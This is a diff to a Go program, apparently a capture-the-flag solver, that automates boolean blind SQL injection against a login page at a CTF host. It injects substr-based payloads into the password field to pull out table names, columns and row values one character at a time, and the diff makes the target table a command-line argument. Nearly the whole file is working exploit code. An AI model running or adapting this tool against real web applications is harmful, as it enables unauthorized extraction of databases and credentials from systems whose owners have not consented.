@@ -5,6 +5,7 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
 	"strings"
 	"time"
 )
@@ -14,32 +15,60 @@ var charTable = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 
 func main() {
 	url := "http://ctf.adl.tw:12004/login.php"
 	method := "POST"
-	resultTable := make(map[string]bool)
 
-	for offset := 0; offset < 13; offset++ {
-		go GetTable(offset, url, method, &resultTable)
-		time.Sleep(time.Millisecond * 200)
-	}
-	for len(resultTable) < 9 {
-		time.Sleep(time.Second * 5)
-	}
-	log.Println(resultTable)
+	/*
+		resultTable := make(map[string]bool)
+			for offset := 0; offset < 13; offset++ {
+				go GetTable(offset, url, method, &resultTable)
+				time.Sleep(time.Millisecond * 200)
+			}
+			for len(resultTable) < 12 {
+				time.Sleep(time.Second * 1)
+			}
+	*/
 
-	valueTable := make(map[string]string)
-	for k := range resultTable {
-		/*if ok, r := GetColumn(0, url, method, k); ok {
-			log.Println("Column: ", r)
-		}*/
+	/*go func() {
+		for k := range resultTable {
+			for offset := 0; offset < 20; offset++ {
+				GetColumn(offset, url, method, k)
+			}
+		}
+	}()*/
 
-		/*if ok, r := GetValue(url, method, k, &valueTable); ok {
-			log.Println("Value: ", r)
-		}*/
-		go GetValue(url, method, k, &valueTable)
+	valueTable2 := make(map[string]string)
+	/*target := []string{
+		"flag1",
+		"flag2",
+		"flag3",
+		"flag4",
+		"flag5",
+		"flag6",
+		"flag7",
+		"flag8",
+		"flag9",
+		"flag10",
 	}
-	for {
-		time.Sleep(time.Second * 5)
-		log.Println(valueTable)
+	for _, v := range target {
+		for offset := 0; offset <= 20; offset++ {
+			go GetValue(offset, url, method, v, &valueTable2)
+		}
+		time.Sleep(time.Millisecond * 1000)
 	}
+	*/
+
+	for offset := 0; offset <= 20; offset++ {
+		GetValue(offset, url, method, os.Args[1], &valueTable2)
+	}
+	time.Sleep(time.Millisecond * 1000)
+
+	/*
+		valueTable := make(map[string]string)
+		for k := range resultTable {
+			for offset := 0; offset <= 20; offset++ {
+				GetValue(offset, url, method, k, &valueTable)
+			}
+		}
+	*/
 }
 
 func GetTable(offset int, url string, method string, resultTable *map[string]bool) (bool, string) {
@@ -56,9 +85,14 @@ func GetTable(offset int, url string, method string, resultTable *map[string]boo
 				result += string(charTable[i])
 				if posi > 1 && string(charTable[i]) == "&" {
 					(*resultTable)[strings.Trim(result, "&")] = true
+					log.Println("Table: ", strings.Trim(result, "&"))
 					return true, strings.Trim(result, "&")
 				}
-				log.Printf("Get: offset=%d, posi=%d, char=%s", offset, posi, string(charTable[i]))
+				break
+				//log.Printf("Get: offset=%d, posi=%d, char=%s", offset, posi, string(charTable[i]))
+			}
+			if i >= len(charTable)-1 {
+				return false, strings.Trim(result, "&")
 			}
 		}
 	}
@@ -80,22 +114,28 @@ func GetColumn(offset int, url, method, table string) (bool, string) {
 			if CheckQuery(url, method, input) {
 				result += string(charTable[i])
 				if posi > 1 && string(charTable[i]) == "&" {
+					log.Println("Column: ", strings.Trim(result, "&"))
 					return true, strings.Trim(result, "&")
 				}
-				log.Printf("Get: offset=%d, posi=%d, char=%s", offset, posi, string(charTable[i]))
+				break
+				//log.Printf("Get: offset=%d, posi=%d, char=%s", offset, posi, string(charTable[i]))
+			}
+			if i >= len(charTable)-1 {
+				return false, strings.Trim(result, "&")
 			}
 		}
 	}
 	return false, result
 }
 
-func GetValue(url, method, table string, valueTable *map[string]string) (bool, string) {
+func GetValue(offset int, url, method, table string, valueTable *map[string]string) (bool, string) {
 	result := ""
 	for posi := 0; posi < 3000; posi++ {
 		for i := range charTable {
 			input := fmt.Sprintf(
-				"ctf_username=admin&ctf_password=' or substr((select flag from %s limit 0,1),%d,1)='%s' --",
+				"ctf_username=admin&ctf_password=' or substr((select * from %s limit %d,1),%d,1)='%s' --",
 				table,
+				offset,
 				posi,
 				string(charTable[i]),
 			)
@@ -103,11 +143,17 @@ func GetValue(url, method, table string, valueTable *map[string]string) (bool, s
 				result += string(charTable[i])
 				if posi > 1 && string(charTable[i]) == "&" {
 					(*valueTable)[strings.Trim(result, "&")] = strings.Trim(result, "&")
+					log.Println("Value(", table, " ", offset, "): ", strings.Trim(result, "&"))
 					return true, strings.Trim(result, "&")
 				}
 				log.Printf("Get: posi=%d, char=%s", posi, string(charTable[i]))
+				break
+			}
+			if i >= len(charTable)-1 {
+				return false, strings.Trim(result, "&")
 			}
 		}
+
 	}
 	return false, result
 }
@@ -137,7 +183,6 @@ func CheckQuery(url string, method string, input string) bool {
 		fmt.Println(err)
 		return false
 	}
-	time.Sleep(time.Millisecond)
 	//log.Println(string(body))
 	return strings.Contains(string(body), "Success")
 }
